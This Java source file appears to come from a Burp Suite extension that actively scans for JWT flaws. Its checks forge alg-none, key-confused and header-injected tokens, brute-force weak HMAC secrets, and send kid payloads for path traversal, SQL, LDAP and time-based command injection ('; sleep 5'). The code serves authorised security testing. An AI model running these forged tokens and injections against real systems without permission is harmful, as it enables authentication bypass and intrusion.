package com.jwtlens;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.collaborator.CollaboratorPayload;
import burp.api.montoya.core.ByteArray;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.scanner.audit.insertionpoint.AuditInsertionPoint;
import burp.api.montoya.scanner.audit.issues.AuditIssue;

import java.security.KeyPair;
import java.security.interfaces.RSAPublicKey;
import java.util.*;

/**
 * Performs all active JWT security checks.
 * Sends modified JWT tokens to the server and analyzes responses.
 * Runs A01 through A33 from the JWTLens checklist.
 */
public class ActiveScanCheck {

    private final MontoyaApi api;
    private final JwtDedup dedup;

    public ActiveScanCheck(MontoyaApi api, JwtDedup dedup) {
        this.api = api;
        this.dedup = dedup;
    }

    /**
     * Run all active checks against a JWT found at the given insertion point.
     */
    public List<AuditIssue> check(HttpRequestResponse baseRequestResponse, AuditInsertionPoint insertionPoint) {
        List<AuditIssue> issues = new ArrayList<>();

        String jwtString = insertionPoint.baseValue();
        JwtToken jwt;
        try {
            jwt = new JwtToken(jwtString);
        } catch (Exception e) {
            return issues;
        }

        String host = baseRequestResponse.request().httpService().host();
        if (dedup.isDuplicate(host, jwt)) {
            return issues;
        }

        // A02: Invalid signature (check first as it affects flow)
        boolean invalidSigAccepted = checkInvalidSignature(baseRequestResponse, insertionPoint, jwt, issues);

        if (invalidSigAccepted) {
            // If invalid sig accepted, most other sig-based attacks are redundant
            // but still check claim tampering since sig bypass is confirmed
            checkClaimTampering(baseRequestResponse, insertionPoint, jwt, issues);
            return issues;
        }

        // A03: Signature stripping
        checkSignatureStripping(baseRequestResponse, insertionPoint, jwt, issues);

        // A01: Algorithm None
        checkAlgNone(baseRequestResponse, insertionPoint, jwt, issues);

        // A05: Empty secret
        checkEmptySecret(baseRequestResponse, insertionPoint, jwt, issues);

        // A06: Weak secret brute force
        checkWeakSecret(baseRequestResponse, insertionPoint, jwt, issues);

        // A04: Expired token accepted
        if (jwt.isExpired()) {
            checkExpiredAccepted(baseRequestResponse, insertionPoint, jwt, issues);
        }

        // A20: CVE-2022-21449 (Psychic Signatures)
        checkPsychicSignatures(baseRequestResponse, insertionPoint, jwt, issues);

        // A23: Null signature bytes
        checkNullSignature(baseRequestResponse, insertionPoint, jwt, issues);

        // A22: Cross algorithm signing
        checkCrossAlgSigning(baseRequestResponse, insertionPoint, jwt, issues);

        // A13: KID path traversal
        if (jwt.hasHeader("kid") || true) {  // try even without kid
            checkKidPathTraversal(baseRequestResponse, insertionPoint, jwt, issues);
        }

        // A14: KID SQL injection
        checkKidSqlInjection(baseRequestResponse, insertionPoint, jwt, issues);

        // A15: KID command injection
        checkKidCommandInjection(baseRequestResponse, insertionPoint, jwt, issues);

        // A16: KID LDAP injection
        checkKidLdapInjection(baseRequestResponse, insertionPoint, jwt, issues);

        // A08: JWK header injection
        checkJwkInjection(baseRequestResponse, insertionPoint, jwt, issues);

        // A09/A10: JKU header injection and pingback
        checkJkuInjection(baseRequestResponse, insertionPoint, jwt, issues);

        // A11: X5U header injection
        checkX5uInjection(baseRequestResponse, insertionPoint, jwt, issues);

        // A12: X5C header injection
        checkX5cInjection(baseRequestResponse, insertionPoint, jwt, issues);

        // A17: nbf bypass
        checkNbfBypass(baseRequestResponse, insertionPoint, jwt, issues);

        // A07: Algorithm confusion (requires public key)
        checkAlgConfusion(baseRequestResponse, insertionPoint, jwt, issues);

        // A27: JWKS discovery
        checkJwksDiscovery(baseRequestResponse, jwt, issues);

        return issues;
    }

    // ============================================================
    // A01: Algorithm None
    // ============================================================
    private void checkAlgNone(HttpRequestResponse base, AuditInsertionPoint ip, JwtToken jwt, List<AuditIssue> issues) {
        for (JwtToken variant : jwt.withAlgNoneVariants()) {
            HttpRequestResponse response = sendCheck(base, ip, variant);
            if (response == null) continue;

            if (ResponseAnalyzer.isServerError(response)) {
                issues.add(Findings.serverError("Algorithm None (" + variant.getAlg().orElse("") + ")", base, response));
                continue;
            }

            if (ResponseAnalyzer.isAccepted(base, response)) {
                issues.add(Findings.a01_algNone(variant, ResponseAnalyzer.getStatusCode(response), base, response));
                return; // One success is enough
            }
        }
    }

    // ============================================================
    // A02: Invalid Signature
    // ============================================================
    private boolean checkInvalidSignature(HttpRequestResponse base, AuditInsertionPoint ip, JwtToken jwt, List<AuditIssue> issues) {
        JwtToken modified = jwt.withRandomizedSignature();
        HttpRequestResponse response = sendCheck(base, ip, modified);
        if (response == null) return false;

        if (ResponseAnalyzer.isAccepted(base, response)) {
            int status = ResponseAnalyzer.getStatusCode(response);
            issues.add(Findings.a02_invalidSignature(status, base, response));
            return true;
        }
        return false;
    }

    // ============================================================
    // A03: Signature Stripping
    // ============================================================
    private void checkSignatureStripping(HttpRequestResponse base, AuditInsertionPoint ip, JwtToken jwt, List<AuditIssue> issues) {
        JwtToken stripped = jwt.withEmptySignature();
        HttpRequestResponse response = sendCheck(base, ip, stripped);
        if (response == null) return;

        if (ResponseAnalyzer.isServerError(response)) {
            issues.add(Findings.serverError("Signature Stripping", base, response));
            return;
        }

        if (ResponseAnalyzer.isAccepted(base, response)) {
            issues.add(Findings.a03_signatureStripping(
                    jwt.getAlg().orElse("unknown"),
                    ResponseAnalyzer.getStatusCode(response),
                    base, response));
        }
    }

    // ============================================================
    // A04: Expired Token Accepted
    // ============================================================
    private void checkExpiredAccepted(HttpRequestResponse base, AuditInsertionPoint ip, JwtToken jwt, List<AuditIssue> issues) {
        // Token is already expired, just send it
        HttpRequestResponse response = sendCheck(base, ip, jwt);
        if (response == null) return;

        if (ResponseAnalyzer.isAccepted(base, response)) {
            issues.add(Findings.a04_expiredAccepted(ResponseAnalyzer.getStatusCode(response), base, response));
        }
    }

    // ============================================================
    // A05: Empty Secret
    // ============================================================
    private void checkEmptySecret(HttpRequestResponse base, AuditInsertionPoint ip, JwtToken jwt, List<AuditIssue> issues) {
        JwtToken modified = jwt.withAlgHs256("");
        HttpRequestResponse response = sendCheck(base, ip, modified);
        if (response == null) return;

        if (ResponseAnalyzer.isServerError(response)) {
            issues.add(Findings.serverError("Empty Secret", base, response));
            return;
        }

        if (ResponseAnalyzer.isAccepted(base, response)) {
            issues.add(Findings.a05_emptySecret(ResponseAnalyzer.getStatusCode(response), base, response));
        }
    }

    // ============================================================
    // A06: Weak Secret Brute Force
    // ============================================================
    private void checkWeakSecret(HttpRequestResponse base, AuditInsertionPoint ip, JwtToken jwt, List<AuditIssue> issues) {
        String signingInput = jwt.getSigningInput();
        String expectedSig = jwt.getSignature();

        // If no signature, skip
        if (expectedSig == null || expectedSig.isEmpty()) return;

        // Get effective wordlist from tab (includes custom uploads)
        JwtLensTab tab = JwtLensExtension.tab();
        List<String> wordlist = (tab != null) ? tab.getEffectiveWordlist() : WeakSecrets.SECRETS;

        // Augment with secrets discovered by SecretExtractor from JS/response bodies
        SecretExtractor extractor = JwtLensExtension.secretExtractor();
        if (extractor != null && !extractor.getDiscoveredSecrets().isEmpty()) {
            List<String> augmented = new ArrayList<>(extractor.getDiscoveredSecrets());
            augmented.addAll(wordlist);
            wordlist = augmented; // Discovered secrets tested first (higher priority)
        }

        // Try all three HMAC algorithms regardless of token's alg header
        String[] hmacAlgs = {"HmacSHA256", "HmacSHA384", "HmacSHA512"};
        String[] algNames = {"HS256", "HS384", "HS512"};

        // Offline verification first (fast, no network)
        for (int a = 0; a < hmacAlgs.length; a++) {
            for (String secret : wordlist) {
                if (CryptoUtils.verifyHmac(hmacAlgs[a], signingInput, secret, expectedSig)) {
                    // Found the secret! Confirm server accepts a re-signed token
                    JwtToken resigned = jwt.withAlgHs256(secret);
                    HttpRequestResponse response = sendCheck(base, ip, resigned);
                    if (response != null && ResponseAnalyzer.isAccepted(base, response)) {
                        issues.add(Findings.a06_weakSecret(secret, ResponseAnalyzer.getStatusCode(response), base, response));
                    }
                    return;
                }
            }
        }

        // If token uses asymmetric alg, we can't offline verify.
        // Try signing with each secret and sending to server (slower, only top 20)
        if (!jwt.hasSymmetricAlg()) {
            List<String> topSecrets = wordlist.subList(0, Math.min(20, wordlist.size()));
            for (String secret : topSecrets) {
                JwtToken resigned = jwt.withAlgHs256(secret);
                HttpRequestResponse response = sendCheck(base, ip, resigned);
                if (response != null && ResponseAnalyzer.isAccepted(base, response)) {
                    issues.add(Findings.a06_weakSecret(secret, ResponseAnalyzer.getStatusCode(response), base, response));
                    return;
                }
            }
        }
    }

    // ============================================================
    // A07: Algorithm Confusion (RS→HS) — Proper JWKS Parsing
    // ============================================================
    private void checkAlgConfusion(HttpRequestResponse base, AuditInsertionPoint ip, JwtToken jwt, List<AuditIssue> issues) {
        if (!jwt.hasAsymmetricAlg()) return;

        String originalAlg = jwt.getAlg().orElse("RS256");
        String tokenKid = jwt.getKid().orElse(null);

        // Build list of JWKS URLs to try
        String scheme = base.request().httpService().secure() ? "https" : "http";
        String host = base.request().httpService().host();
        int port = base.request().httpService().port();
        String portStr = ((scheme.equals("https") && port == 443) || (scheme.equals("http") && port == 80)) ? "" : ":" + port;
        String baseUrl = scheme + "://" + host + portStr;

        String[] jwksUrls = {
                baseUrl + "/.well-known/jwks.json",
                baseUrl + "/jwks.json",
                baseUrl + "/oauth/discovery/keys",
                baseUrl + "/.well-known/keys"
        };
        String[] oidcUrls = {
                baseUrl + "/.well-known/openid-configuration"
        };

        List<RSAPublicKey> realKeys = new ArrayList<>();
        List<String> keySources = new ArrayList<>();

        // Phase 1: Try direct JWKS endpoints
        for (String jwksUrl : jwksUrls) {
            try {
                HttpRequest jwksReq = HttpRequest.httpRequestFromUrl(jwksUrl);
                HttpRequestResponse jwksResp = api.http().sendRequest(jwksReq);
                if (jwksResp.response() != null && jwksResp.response().statusCode() == 200) {
                    String body = jwksResp.response().bodyToString();
                    List<JwksParser.JwkKey> parsed = JwksParser.parseJwks(body);
                    if (!parsed.isEmpty()) {
                        api.logging().logToOutput("JWTLens A07: Parsed " + parsed.size() + " RSA keys from " + jwksUrl);
                        // Add the best matching key first, then all others
                        JwksParser.JwkKey best = JwksParser.findBestKey(parsed, tokenKid);
                        if (best != null) {
                            realKeys.add(best.publicKey);
                            keySources.add(jwksUrl + " (kid=" + best.kid + ", " + best.publicKey.getModulus().bitLength() + "-bit)");
                        }
                        for (JwksParser.JwkKey k : parsed) {
                            if (k != best) {
                                realKeys.add(k.publicKey);
                                keySources.add(jwksUrl + " (kid=" + k.kid + ")");
                            }
                        }
                    }
                }
            } catch (Exception ignored) {
            }
        }

        // Phase 2: Try OpenID Configuration to find jwks_uri
        if (realKeys.isEmpty()) {
            for (String oidcUrl : oidcUrls) {
                try {
                    HttpRequest req = HttpRequest.httpRequestFromUrl(oidcUrl);
                    HttpRequestResponse resp = api.http().sendRequest(req);
                    if (resp.response() != null && resp.response().statusCode() == 200) {
                        String jwksUri = JwksParser.extractJwksUri(resp.response().bodyToString());
                        if (jwksUri != null) {
                            api.logging().logToOutput("JWTLens A07: Found jwks_uri in OIDC config: " + jwksUri);
                            HttpRequest jwksReq = HttpRequest.httpRequestFromUrl(jwksUri);
                            HttpRequestResponse jwksResp = api.http().sendRequest(jwksReq);
                            if (jwksResp.response() != null && jwksResp.response().statusCode() == 200) {
                                List<JwksParser.JwkKey> parsed = JwksParser.parseJwks(jwksResp.response().bodyToString());
                                JwksParser.JwkKey best = JwksParser.findBestKey(parsed, tokenKid);
                                if (best != null) {
                                    realKeys.add(best.publicKey);
                                    keySources.add(jwksUri + " via " + oidcUrl + " (kid=" + best.kid + ")");
                                }
                                for (JwksParser.JwkKey k : parsed) {
                                    if (k != best) {
                                        realKeys.add(k.publicKey);
                                        keySources.add(jwksUri + " (kid=" + k.kid + ")");
                                    }
                                }
                            }
                        }
                    }
                } catch (Exception ignored) {
                }
            }
        }

        // Phase 3: Try public keys discovered by SecretExtractor
        SecretExtractor extractor = JwtLensExtension.secretExtractor();
        if (extractor != null) {
            for (String pemKey : extractor.getDiscoveredPublicKeys()) {
                try {
                    // Parse PEM to RSAPublicKey
                    String b64 = pemKey
                            .replace("-----BEGIN PUBLIC KEY-----", "")
                            .replace("-----END PUBLIC KEY-----", "")
                            .replace("-----BEGIN RSA PUBLIC KEY-----", "")
                            .replace("-----END RSA PUBLIC KEY-----", "")
                            .replaceAll("\\s+", "");
                    byte[] keyBytes = java.util.Base64.getDecoder().decode(b64);
                    java.security.spec.X509EncodedKeySpec spec = new java.security.spec.X509EncodedKeySpec(keyBytes);
                    java.security.KeyFactory kf = java.security.KeyFactory.getInstance("RSA");
                    RSAPublicKey pubKey = (RSAPublicKey) kf.generatePublic(spec);
                    realKeys.add(pubKey);
                    keySources.add("Extracted from response body (SecretExtractor)");
                } catch (Exception ignored) {
                }
            }
        }

        // Phase 4: Test each real key for algorithm confusion (both DER and PEM formats)
        for (int i = 0; i < realKeys.size(); i++) {
            RSAPublicKey pubKey = realKeys.get(i);
            String source = keySources.get(i);
            int keyBits = pubKey.getModulus().bitLength();

            byte[][] keyFormats = {
                    CryptoUtils.rsaPublicKeyToBytes(pubKey),
                    CryptoUtils.rsaPublicKeyToPemBytes(pubKey)
            };

            for (byte[] keyBytes : keyFormats) {
                JwtToken confused = jwt.withAlgHs256Bytes(keyBytes);
                HttpRequestResponse response = sendCheck(base, ip, confused);
                if (response == null) continue;

                if (ResponseAnalyzer.isAccepted(base, response)) {
                    issues.add(Findings.a07_algConfusionReal(
                            originalAlg, source, keyBits,
                            ResponseAnalyzer.getStatusCode(response),
                            base, response));
                    return;
                }
            }
        }

        // Phase 5: Fallback — use generated key pair (for cases where JWKS is not available)
        if (realKeys.isEmpty()) {
            KeyPair kp = CryptoUtils.getOrGenerateRsaKeyPair();
            RSAPublicKey pubKey = (RSAPublicKey) kp.getPublic();

            byte[][] keyFormats = {
                    CryptoUtils.rsaPublicKeyToBytes(pubKey),
                    CryptoUtils.rsaPublicKeyToPemBytes(pubKey)
            };

            for (byte[] keyBytes : keyFormats) {
                JwtToken confused = jwt.withAlgHs256Bytes(keyBytes);
                HttpRequestResponse response = sendCheck(base, ip, confused);
                if (response == null) continue;

                if (ResponseAnalyzer.isAccepted(base, response)) {
                    issues.add(Findings.a07_algConfusion(
                            originalAlg, "Generated RSA public key (JWKS not found)",
                            ResponseAnalyzer.getStatusCode(response),
                            base, response));
                    return;
                }
            }
        }
    }

    // ============================================================
    // A08: JWK Header Injection
    // ============================================================
    private void checkJwkInjection(HttpRequestResponse base, AuditInsertionPoint ip, JwtToken jwt, List<AuditIssue> issues) {
        KeyPair kp = CryptoUtils.getOrGenerateRsaKeyPair();
        RSAPublicKey pubKey = (RSAPublicKey) kp.getPublic();
        String kid = UUID.randomUUID().toString();

        // Build JWK as a map
        String jwkJson = CryptoUtils.rsaPublicKeyToJwk(pubKey, kid);
        com.google.gson.Gson gson = new com.google.gson.Gson();
        @SuppressWarnings("unchecked")
        Map<String, Object> jwkMap = gson.fromJson(jwkJson, LinkedHashMap.class);

        JwtToken modified = jwt
                .withHeader("alg", "RS256")
                .withHeader("kid", kid)
                .withHeader("jwk", jwkMap);

        // Sign with our private key
        String sig = CryptoUtils.signRsa("SHA256withRSA", modified.getSigningInput(), kp.getPrivate());
        modified = modified.withSignature(sig);

        HttpRequestResponse response = sendCheck(base, ip, modified);
        if (response == null) return;

        if (ResponseAnalyzer.isServerError(response)) {
            issues.add(Findings.serverError("JWK Header Injection", base, response));
            return;
        }

        if (ResponseAnalyzer.isAccepted(base, response)) {
            issues.add(Findings.a08_jwkInjection(ResponseAnalyzer.getStatusCode(response), base, response));
        }
    }

    // ============================================================
    // A09/A10: JKU Header Injection + Pingback
    // ============================================================
    private void checkJkuInjection(HttpRequestResponse base, AuditInsertionPoint ip, JwtToken jwt, List<AuditIssue> issues) {
        KeyPair kp = CryptoUtils.getOrGenerateRsaKeyPair();
        RSAPublicKey pubKey = (RSAPublicKey) kp.getPublic();
        String kid = UUID.randomUUID().toString();

        // Create JWKS and encode it for use with httpbin
        String jwksJson = CryptoUtils.createJwks(pubKey, kid);
        String jwksBase64 = Base64.getUrlEncoder().encodeToString(jwksJson.getBytes());
        String jkuUrl = "https://httpbin.org/base64/" + jwksBase64;

        JwtToken modified = jwt
                .withHeader("alg", "RS256")
                .withHeader("kid", kid)
                .withHeader("jku", jkuUrl);

        String sig = CryptoUtils.signRsa("SHA256withRSA", modified.getSigningInput(), kp.getPrivate());
        modified = modified.withSignature(sig);

        HttpRequestResponse response = sendCheck(base, ip, modified);
        if (response == null) return;

        if (ResponseAnalyzer.isAccepted(base, response)) {
            issues.add(Findings.a09_jkuInjection(jkuUrl, ResponseAnalyzer.getStatusCode(response), base, response));
        }

        // A10: Try with Collaborator for pingback detection
        try {
            CollaboratorPayload collabPayload = api.collaborator().defaultPayloadGenerator().generatePayload();
            String collabUrl = "https://" + collabPayload.toString() + "/jwks.json";

            JwtToken collabJwt = jwt
                    .withHeader("alg", "RS256")
                    .withHeader("kid", kid)
                    .withHeader("jku", collabUrl);
            String collabSig = CryptoUtils.signRsa("SHA256withRSA", collabJwt.getSigningInput(), kp.getPrivate());
            collabJwt = collabJwt.withSignature(collabSig);

            HttpRequestResponse collabResponse = sendCheck(base, ip, collabJwt);
            // Collaborator interactions would be checked asynchronously
            // For now, we note that we sent the probe
        } catch (Exception ignored) {
            // Collaborator may not be available (Community edition)
        }
    }

    // ============================================================
    // A11: X5U Header Injection
    // ============================================================
    private void checkX5uInjection(HttpRequestResponse base, AuditInsertionPoint ip, JwtToken jwt, List<AuditIssue> issues) {
        KeyPair kp = CryptoUtils.getOrGenerateRsaKeyPair();
        String kid = UUID.randomUUID().toString();

        // Use httpbin to serve the public key
        String pubKeyPem = CryptoUtils.rsaPublicKeyToPem((RSAPublicKey) kp.getPublic());
        String pubKeyBase64 = Base64.getUrlEncoder().encodeToString(pubKeyPem.getBytes());
        String x5uUrl = "https://httpbin.org/base64/" + pubKeyBase64;

        JwtToken modified = jwt
                .withHeader("alg", "RS256")
                .withHeader("kid", kid)
                .withHeader("x5u", x5uUrl);

        String sig = CryptoUtils.signRsa("SHA256withRSA", modified.getSigningInput(), kp.getPrivate());
        modified = modified.withSignature(sig);

        HttpRequestResponse response = sendCheck(base, ip, modified);
        if (response == null) return;

        if (ResponseAnalyzer.isAccepted(base, response)) {
            issues.add(Findings.a11_x5uInjection(x5uUrl, ResponseAnalyzer.getStatusCode(response), base, response));
        }
    }

    // ============================================================
    // A12: X5C Header Injection
    // ============================================================
    private void checkX5cInjection(HttpRequestResponse base, AuditInsertionPoint ip, JwtToken jwt, List<AuditIssue> issues) {
        CryptoUtils.SelfSignedCert cert = CryptoUtils.generateSelfSignedCert();
        String kid = UUID.randomUUID().toString();

        // Embed cert in x5c as a list of Base64 DER certs
        List<String> x5cChain = List.of(cert.certBase64Der);

        JwtToken modified = jwt
                .withHeader("alg", "RS256")
                .withHeader("kid", kid)
                .withHeader("x5c", x5cChain);

        String sig = CryptoUtils.signRsa("SHA256withRSA", modified.getSigningInput(), cert.keyPair.getPrivate());
        modified = modified.withSignature(sig);

        HttpRequestResponse response = sendCheck(base, ip, modified);
        if (response == null) return;

        if (ResponseAnalyzer.isAccepted(base, response)) {
            issues.add(Findings.a12_x5cInjection(ResponseAnalyzer.getStatusCode(response), base, response));
        }
    }

    // ============================================================
    // A13: KID Path Traversal
    // ============================================================
    private void checkKidPathTraversal(HttpRequestResponse base, AuditInsertionPoint ip, JwtToken jwt, List<AuditIssue> issues) {
        for (JwtToken variant : jwt.withKidPathTraversalVariants()) {
            HttpRequestResponse response = sendCheck(base, ip, variant);
            if (response == null) continue;

            if (ResponseAnalyzer.isServerError(response)) {
                issues.add(Findings.serverError("KID Path Traversal", base, response));
                continue;
            }

            if (ResponseAnalyzer.isAccepted(base, response)) {
                String traversalPath = variant.getKid().orElse("");
                issues.add(Findings.a13_kidPathTraversal(
                        traversalPath,
                        ResponseAnalyzer.getStatusCode(response),
                        base, response));
                return; // One success is enough
            }
        }
    }

    // ============================================================
    // A14: KID SQL Injection
    // ============================================================
    private void checkKidSqlInjection(HttpRequestResponse base, AuditInsertionPoint ip, JwtToken jwt, List<AuditIssue> issues) {
        for (JwtToken variant : jwt.withKidSqlInjectionVariants()) {
            HttpRequestResponse response = sendCheck(base, ip, variant);
            if (response == null) continue;

            if (ResponseAnalyzer.isServerError(response)) {
                // Server error on SQL payload is a strong indicator
                String sqlPayload = variant.getKid().orElse("");
                issues.add(Findings.a14_kidSqlInjection(
                        sqlPayload,
                        ResponseAnalyzer.getStatusCode(response),
                        base, response));
                return;
            }

            if (ResponseAnalyzer.isAccepted(base, response)) {
                String sqlPayload = variant.getKid().orElse("");
                issues.add(Findings.a14_kidSqlInjection(
                        sqlPayload,
                        ResponseAnalyzer.getStatusCode(response),
                        base, response));
                return;
            }
        }
    }

    // ============================================================
    // A15: KID Command Injection (time-based)
    // ============================================================
    private void checkKidCommandInjection(HttpRequestResponse base, AuditInsertionPoint ip, JwtToken jwt, List<AuditIssue> issues) {
        // First establish baseline response time
        long startBaseline = System.currentTimeMillis();
        HttpRequestResponse baselineResponse = sendCheck(base, ip, jwt);
        long baselineMs = System.currentTimeMillis() - startBaseline;

        if (baselineResponse == null) return;

        // Test time-based payloads
        String[] timePayloads = {"| sleep 5", "; sleep 5", "$(sleep 5)", "`sleep 5`"};
        for (String payload : timePayloads) {
            JwtToken modified = jwt.withHeader("kid", payload).withAlgHs256("");

            long startCheck = System.currentTimeMillis();
            HttpRequestResponse response = sendCheck(base, ip, modified);
            long checkMs = System.currentTimeMillis() - startCheck;

            if (response == null) continue;

            // If response took >4 seconds longer than baseline, likely command injection
            if (ResponseAnalyzer.isTimeBased(baselineMs, checkMs, 4000)) {
                issues.add(Findings.a15_kidCommandInjection(
                        payload,
                        "Time based detection: baseline " + baselineMs + "ms vs check " + checkMs + "ms",
                        base, response));
                return;
            }
        }
    }

    // ============================================================
    // A16: KID LDAP Injection
    // ============================================================
    private void checkKidLdapInjection(HttpRequestResponse base, AuditInsertionPoint ip, JwtToken jwt, List<AuditIssue> issues) {
        for (JwtToken variant : jwt.withKidLdapInjectionVariants()) {
            HttpRequestResponse response = sendCheck(base, ip, variant);
            if (response == null) continue;

            if (ResponseAnalyzer.isAccepted(base, response)) {
                String payload = variant.getKid().orElse("");
                issues.add(Findings.a16_kidLdapInjection(payload, base, response));
                return;
            }
        }
    }

    // ============================================================
    // A17: nbf Bypass
    // ============================================================
    private void checkNbfBypass(HttpRequestResponse base, AuditInsertionPoint ip, JwtToken jwt, List<AuditIssue> issues) {
        JwtToken modified = jwt.withFutureNbf();
        // Re-sign with original algorithm if possible, or use as-is
        HttpRequestResponse response = sendCheck(base, ip, modified);
        if (response == null) return;

        if (ResponseAnalyzer.isAccepted(base, response)) {
            issues.add(Findings.a17_nbfBypass(ResponseAnalyzer.getStatusCode(response), base, response));
        }
    }

    // ============================================================
    // A18: Claim Tampering (requires a successful signature bypass)
    // ============================================================
    private void checkClaimTampering(HttpRequestResponse base, AuditInsertionPoint ip, JwtToken jwt, List<AuditIssue> issues) {
        for (JwtToken variant : jwt.withPrivilegeEscalationVariants()) {
            // Since we know signature isn't validated, just randomize the sig
            JwtToken tampered = variant.withRandomizedSignature();
            HttpRequestResponse response = sendCheck(base, ip, tampered);
            if (response == null) continue;

            if (ResponseAnalyzer.isAccepted(base, response)) {
                // Check if response differs from baseline (different content = different access)
                String modifiedClaims = describeClaimDiff(jwt, variant);
                issues.add(Findings.a18_claimTampering(
                        modifiedClaims,
                        ResponseAnalyzer.getStatusCode(response),
                        base, response));
                return; // One success demonstrates the issue
            }
        }
    }

    // ============================================================
    // A20: CVE-2022-21449 Psychic Signatures
    // ============================================================
    private void checkPsychicSignatures(HttpRequestResponse base, AuditInsertionPoint ip, JwtToken jwt, List<AuditIssue> issues) {
        JwtToken modified = jwt.withInvalidEcdsa();
        HttpRequestResponse response = sendCheck(base, ip, modified);
        if (response == null) return;

        if (ResponseAnalyzer.isServerError(response)) {
            issues.add(Findings.serverError("CVE-2022-21449", base, response));
            return;
        }

        if (ResponseAnalyzer.isAccepted(base, response)) {
            issues.add(Findings.a20_cve202221449(ResponseAnalyzer.getStatusCode(response), base, response));
        }
    }

    // ============================================================
    // A22: Cross Algorithm Signing
    // ============================================================
    private void checkCrossAlgSigning(HttpRequestResponse base, AuditInsertionPoint ip, JwtToken jwt, List<AuditIssue> issues) {
        String originalAlg = jwt.getAlg().orElse("unknown");

        // Try signing with HS384 and HS512 with empty key
        String[][] variants = {
                {"HS384", "HmacSHA384", "empty key"},
                {"HS512", "HmacSHA512", "empty key"},
        };

        for (String[] v : variants) {
            if (v[0].equals(originalAlg)) continue; // Skip same algorithm

            JwtToken modified = jwt.withHeader("alg", v[0]);
            String sig = CryptoUtils.signHmac(v[1], modified.getSigningInput(), "");
            modified = modified.withSignature(sig);

            HttpRequestResponse response = sendCheck(base, ip, modified);
            if (response == null) continue;

            if (ResponseAnalyzer.isAccepted(base, response)) {
                issues.add(Findings.a22_crossAlgSigning(
                        originalAlg, v[0], v[2],
                        ResponseAnalyzer.getStatusCode(response),
                        base, response));
                return;
            }
        }
    }

    // ============================================================
    // A23: Null Signature Bytes
    // ============================================================
    private void checkNullSignature(HttpRequestResponse base, AuditInsertionPoint ip, JwtToken jwt, List<AuditIssue> issues) {
        // Try null bytes of various lengths
        int[] lengths = {32, 48, 64};
        for (int len : lengths) {
            JwtToken modified = jwt.withNullSignature(len);
            HttpRequestResponse response = sendCheck(base, ip, modified);
            if (response == null) continue;

            if (ResponseAnalyzer.isAccepted(base, response)) {
                issues.add(Findings.a23_nullSignature(ResponseAnalyzer.getStatusCode(response), base, response));
                return;
            }
        }
    }

    // ============================================================
    // A27: JWKS Discovery
    // ============================================================
    private void checkJwksDiscovery(HttpRequestResponse base, JwtToken jwt, List<AuditIssue> issues) {
        String scheme = base.request().httpService().secure() ? "https" : "http";
        String host = base.request().httpService().host();
        int port = base.request().httpService().port();
        String portStr = ((scheme.equals("https") && port == 443) || (scheme.equals("http") && port == 80)) ? "" : ":" + port;
        String baseUrl = scheme + "://" + host + portStr;

        String[] paths = {
                "/.well-known/jwks.json",
                "/jwks.json",
                "/.well-known/openid-configuration",
                "/oauth/discovery/keys",
                "/.well-known/keys"
        };

        for (String path : paths) {
            try {
                String url = baseUrl + path;
                HttpRequest req = HttpRequest.httpRequestFromUrl(url);
                HttpRequestResponse response = api.http().sendRequest(req);

                if (response.response() != null && response.response().statusCode() == 200) {
                    String body = response.response().bodyToString();
                    if (body.contains("\"keys\"") || body.contains("\"jwks_uri\"") || body.contains("\"kty\"")) {
                        issues.add(Findings.a27_jwksDiscovered(url, "JWKS content found at this endpoint.", base, response));
                        return;
                    }
                }
            } catch (Exception ignored) {
            }
        }
    }

    // ============================================================
    // HELPER METHODS
    // ============================================================

    /**
     * Sends a check request with the modified JWT.
     */
    private HttpRequestResponse sendCheck(HttpRequestResponse base, AuditInsertionPoint ip, JwtToken modified) {
        try {
            HttpRequest checkReq = ip.buildHttpRequestWithPayload(
                    ByteArray.byteArray(modified.encode())
            );
            return api.http().sendRequest(checkReq);
        } catch (Exception e) {
            api.logging().logToError("JWTLens: Failed to send check request: " + e.getMessage());
            return null;
        }
    }

    /**
     * Describes the difference between original and modified JWT claims.
     */
    private String describeClaimDiff(JwtToken original, JwtToken modified) {
        StringBuilder sb = new StringBuilder();
        Map<String, Object> origPayload = original.getPayload();
        Map<String, Object> modPayload = modified.getPayload();

        for (Map.Entry<String, Object> entry : modPayload.entrySet()) {
            Object origVal = origPayload.get(entry.getKey());
            if (!Objects.equals(origVal, entry.getValue())) {
                if (sb.length() > 0) sb.append(", ");
                sb.append(entry.getKey()).append(": ");
                if (origVal != null) {
                    sb.append(origVal).append(" -> ");
                }
                sb.append(entry.getValue());
            }
        }

        return sb.toString();
    }
}
